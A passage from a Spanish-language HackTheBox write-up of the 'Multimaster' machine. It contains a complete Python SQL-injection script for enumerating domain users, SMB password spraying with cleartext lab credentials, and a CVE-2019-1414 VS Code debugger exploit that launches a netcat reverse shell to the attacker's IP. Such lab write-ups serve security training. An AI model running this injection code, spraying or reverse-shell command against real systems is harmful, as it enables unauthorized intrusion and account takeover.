	return str(ID+"0000") #Por último lo retornamos.
```
 
 Creó un nuevo método de enviar la inyección.
```python
def sqlif(inyeccion):
	url = 'http://multimaster.htb/api/getColleagues' #Definimos la url.
	headers = {'Content-Type': 'application/json; charset=utf-8'} #Definimos el header.
	r1 = requests.post(url, data = '{"name":"'+str(inyeccion)+'"}', headers=headers) #Enviamos la petición.
	regex = re.findall(r'(?P<jamon>\w*[A-Z]\\\\\w*)',r1.text) #Utilizamos la libreria re pata filtrar solo lo que nos interesa de la respuesta.
	return regex #Retornamos la respuesta final.
```
Por último actualizamos nuestro método main. 
```python
if __name__ == "__main__":

	if(len(sys.argv) == 2): #Si recibe dos parametros entra aquí.
		inyeccion = sys.argv[1] #Si solo enviamos un parámetro realizara una inyección.
		print(sqli(encodeText(inyeccion))) #Retorna la inyección


	elif(len(sys.argv)==3): #Si recibe tres parámetros entra aquí.
		p1 = log.progress("Enumeración")
		p1.status("Buscando cuentas de dominio.")
		print("\nSID: " + SID + "\n")
		
		#Recibe dos parámetros
		min = sys.argv[1] #De que número va a empezar a fuzzear.
		max = sys.argv[2] #A que número finaliza. 

		for num in range(int(min),int(max)): #Definimos un for con los rangos que le dimos.
			RID = SID + fuzzing(num) #Obtenemos el RID completo.
			inyeccion = "-' union select 1,(SELECT SUSER_SNAME({})),3,4,5--".format(RID) #Realizamos la inyección que nos devolvera los nombres de cuentas de usuarios del Controlador de dominio.
			if( len(sqlif(encodeText(inyeccion))) != 0 ): #Si la longitud de la respuesta es diferente de 0 entra aquí.
				print("Usuario encontrado: " + str(sqlif(encodeText(inyeccion))[0])) #Me imprime el nombre de usuario.


		p1.success("Proceso Finalizado")

	elif(len(sys.argv) != 2 or len(sys.argv) != 3): #Si no es ninguna de los if de arriba entra aquí. (Panel de ayuda)
		log.info("Uso: python3 {} <Inyeccion>".format(sys.argv[0]))
		log.info("Uso: python3 {} <Min> <Max>".format(sys.argv[0]))
		sys.exit(0)
```

**Script completo: multimasterAttack.py**
```python
#!/usr/bin/env python3
#Author: Intrusionz3r0

import requests,sys,signal,json,re
from pwn import *

SID = "0X0105000000000005150000001C00D1BCD181F1492BDFC236"

def handler(key,frame):
	print("Adios!!")
	sys.exit(0)

signal = signal.signal(signal.SIGINT,handler)


def fuzzing(num):

	array=[]
	hexn = hex(num)
	hexn = hexn.replace("x","")
	for char in str(hexn):
		array.append(char)

	ID = str(array[2]+array[3]+array[0]+array[1])
	return str(ID+"0000")

def encodeText(texto):
	textoF = []

	for x in texto:
		char = hex(ord(x))
		char = char.replace("0x","\\u00")
		textoF.append(char)

	textoF = "".join(textoF)
	return textoF

def sqli(inyeccion):

	url = 'http://multimaster.htb/api/getColleagues'
	headers = {'Content-Type': 'application/json; charset=utf-8'}
	r1 = requests.post(url, data = '{"name":"'+str(inyeccion)+'"}', headers=headers)
	parsed = json.loads(r1.text)
	return (json.dumps(parsed, indent=4, sort_keys=True))


def sqlif(inyeccion):

	url = 'http://multimaster.htb/api/getColleagues'
	headers = {'Content-Type': 'application/json; charset=utf-8'}
	r1 = requests.post(url, data = '{"name":"'+str(inyeccion)+'"}', headers=headers)
	regex = re.findall(r'(?P<jamon>\w*[A-Z]\\\\\w*)',r1.text)
	return regex


if __name__ == "__main__":

	if(len(sys.argv) == 2):
		inyeccion = sys.argv[1]
		print(sqli(encodeText(inyeccion)))


	elif(len(sys.argv)==3):
		p1 = log.progress("Enumeración")
		p1.status("Buscando cuentas de dominio.")
		print("\nSID: " + SID + "\n")

		min = sys.argv[1]
		max = sys.argv[2]

		for num in range(int(min),int(max)):
			RID = SID + fuzzing(num)
			inyeccion = "-' union select 1,(SELECT SUSER_SNAME({})),3,4,5--".format(RID)
			if( len(sqlif(encodeText(inyeccion))) != 0 ):
				print("Usuario encontrado: " + str(sqlif(encodeText(inyeccion))[0]))


		p1.success("Proceso Finalizado")

	elif(len(sys.argv) != 2 or len(sys.argv) != 3):
		log.info("Uso: python3 {} <Inyeccion>".format(sys.argv[0]))
		log.info("Uso: python3 {} <Min> <Max>".format(sys.argv[0]))
		sys.exit(0)
```
# Obteniendo cuentas de dominio.

![](https://lh6.googleusercontent.com/_Oeofx6FtnvzfiNGkhzbuJ_D0soJ_UA0zO1Wli-r3XuNMdZoo_FepPoNYw7Gxfh5BBau8BWwhYzEJSCanV2slELcmIB5iiVdA8GnYNEoshJNnn_7fj1fsT6sXNT16JqwWJBUEtwh)

Crearé una lista con los cuentas de dominio que acabamos de encontrar para realizar un ataque de fuerza bruta para dar con la contraseña, a ver si ahora si tenemos suerte.

![](https://lh6.googleusercontent.com/kGlwJcW8SdKUch8CRLYdYT2JtosDtTJI2KLNPIpEHptL0yhkWDcJMcDB2T1kvrSo_Zdu6-ihNJJ7rR29VUzktHJD_4wBDpJbB7Ef0jo03NCL77qbSHDrACaiWXQu_ieMSSdQkudL)


```console
intrusionz3r0@kali:~$ cme smb multimaster.htb -u users2.txt -p passwords.txt
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Administrator:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Administrator:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Administrator:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Guest:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Guest:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Guest:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\krbtgt:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\krbtgt:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\krbtgt:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1
```
**¡¡Eureka!!**
Tenemos unas credenciales validas: `tushikikatomo:finance1`.

# Shell como el usuario tushikikatomo.

Utilizo evil-winrm para loguearme como el usuario tushikikatomo.

![](https://lh5.googleusercontent.com/Mwq97K-S-5mfYC70CruBrBpdu39zRT51QdtWxPMfIHtSZvapOZN4ndHmMSXlcd64-evuj9JHTlQmAT3ZKhYaWGNCaQpDWHnTy6974CYu_DKSpa-3jlJPAxd9_jsTKBzZjfs121X_)

# Abusando de Visual Studio Code.

Iré al grano para no hacer el writeup tan largo, si revisamos los procesos.

```console
*Evil-WinRM* PS C:\Users\alcibiades\Documents> Get-process                                                                                                    [32/32]
                                                                                                                                                                     
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                
-------  ------    -----      -----     ------     --  -- -----------                                                                                                
    284      51    58660      74240               968   1 Code                                                                                                       
    413      55    96544     104012              3296   1 Code                                                                                                       
    329      32    40664      35384              3556   1 Code                                                                                                       
    413      54    96648     135272              4000   1 Code                                                                                                       
    679      52    34092      82032              4292   1 Code                                                                                                       
    415      53    94504      68456              4600   1 Code                                                                                                       
    416      55    97000     135540              4880   1 Code                                                                                                       
    231      15     6132       5560              5048   1 Code                                                                                                       
    283      51    58064      33060              5572   1 Code                                                                                                       
    284      51    57916      54024              5784   1 Code                                                                                                       
    285      51    57876      74476              5956   1 Code                                                                                                       
    430      23    15740      11880              6044   1 Code
```
Vemos que tenemos un visual studio en ejecución.

Rápidamente reviso la versión del visual studio para comenzar a buscar si esta versión esta asociada a alguna vulnerabilidad critica.

```console
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> .\code -h                                                                                             [22/22]
Visual Studio Code 1.37.1
```
**Versión: 1.37.1**

Hago una busqueda en google y encuentro el siguiente resultado:  [https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414)

**Descripción:**
Existe una vulnerabilidad de elevación de privilegios en Visual Studio Code cuando expone un detector de depuración a los usuarios de un equipo local. Un atacante local que aproveche con éxito la vulnerabilidad podría inyectar código arbitrario para que se ejecute en el contexto del usuario actual. Si el usuario actual está conectado con derechos de usuario administrativo, un atacante podría tomar el control del sistema afectado.

Vamos a aprovecharnos de esto para escalar, para ello me descargo el siguiente debug: [cefdebug 2.0](https://github.com/taviso/cefdebug/releases/tag/v0.2)

Me monto un servidor con samba compartiendo el `cefdebug.exe` y `nc.exe` para después descargarlos en la máquina.

```console
intrusionz3r0@kali:~$ sudo impacket-smbserver smbFolder $(pwd) -smb2support -username fg -password fg
```

![](https://lh3.googleusercontent.com/a7P-R8OErwLx9qoxf5odlnHMqYJdlOen-JgMjXRF3_e6JihrT58dwOdwRSBBYwUsFPm7xGX7CcIPjE8oebpDRpe7fX-STke9wSRimIAxbvIs8ctw9HrOhX2_MVE3JnUBVfNBqUB7)

![](https://lh4.googleusercontent.com/SP88a6466sUpaNygBObaoWssylWSBn5BX6aiIe0Ks9oUAo1eaxhkGLnraGvfjZN8Ff6FIXzmKIXYkYpJo0d9n2RH9bf09pm4iq3zyidK12ca2ShCdHE6w4Dl3ygTLZ1zVsZqloS6)

Para poder explotar la vulnerabilidad primero necesitamos encontrar un socket, para ello escaneo la máquina con cefdebug.

```console
*Evil-WinRM* PS C:\Temp> .\cefdebug.exe
[2020/08/19 11:58:38:9491] U: There were 2 servers that appear to be CEF debuggers.
[2020/08/19 11:58:38:9491] U: ws://127.0.0.1:32307/f5171393-524a-4435-8c98-14e0feca650e
[2020/08/19 11:58:38:9491] U: ws://127.0.0.1:36810/0fd22c26-a0cb-4cf6-b274-c587d00db411
```
Después tomo uno de los sockets a la escucha y me envió una reverse shell con el netcat que nos habíamos descargado anteriormente.

```console
*Evil-WinRM* PS C:\Temp> ./cefdebug.exe --url ws://127.0.0.1:36810/0fd22c26-a0cb-4cf6-b274-c587d00db411 --code "process.mainModule.require('child_process').exec('cmd.exe /c c:/Temp/nc.exe 10.10.14.7 5544 -e cmd.exe').toString()"
```


![](https://lh5.googleusercontent.com/tG4N5O3Zlh3P5jeipqVvt3wD4qfVIftr-gXR368dEsyH5arcOickZtJm6WoVGhphgY-gXKvWQlN5dw0PI9TiMzmYQyLca0-jOgL_Mgd3AZ5jNzmyZmmDxqz9En0-Kb9WMjTCluaM)


# Shell como cyork.

![enter image description here](https://i.ytimg.com/vi/yKogfDi9_xI/maxresdefault.jpg)

# Buscando en las entrañas de una DLL.

Enumerando un poco en la máquina encontramos una dll bastante interesante.

```powershell
*Evil-WinRM* PS c:\inetpub\wwwroot\bin>dir

 Volume in drive C has no label.
 Volume Serial Number is 5E12-F84E

 Directory of c:\inetpub\wwwroot\bin

01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll
02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb
05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
```

Rápidamente abro `IDA`, me importó `MultimasterAPI.dll`  y comienzo a analizarla a profundidad.

![](https://lh3.googleusercontent.com/SiKjwjC55zGOs-nF8_2XpHAsHzZd-1x2W1xWdpX9uVJGjFCxbqdZlFOzFfnYwBw-p06_nMqlbeTwi8T7XiWU2bpsaRe3bwqUspai5XFYdWnnQ1N_YbCwI8hKS7Q9o2ScjeV94DvT)

Después de estar buscando entre las entrañas de la dll finalmente encontramos lo que parece ser una contraseña: `D3veL0pM3nT!`

Ejecutó crackmapexec para averiguar a qué usuario pertenece esa contraseña.

```console
intrusionz3r0@kali:~$ cme smb multimaster.htb -u users.txt -p D3veL0pM3nT! 

SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minatotw:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
```
**¡¡Eureka!!**
Encontramos unas credenciales válidas: `sbauer:D3veL0pM3nT!` 

# Shell como el usuario sbauer.

Utilizó la herramienta evil-winrm para loguearme con el usuario sbauer.

```console
intrusionz3r0@kali:~$ evil-winrm -i 10.10.10.179 -u sbauer -p D3veL0pM3nT!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\Documents> whoami
megacorp\sbauer
*Evil-WinRM* PS C:\Users\sbauer\Documents>
```
Paso el tiempo hasta que decidí comenzar a enumerar más seriamente el directorio activo con nuestro amigo el perro.

# BloodHound.

![enter image description here](data:image/png;base64,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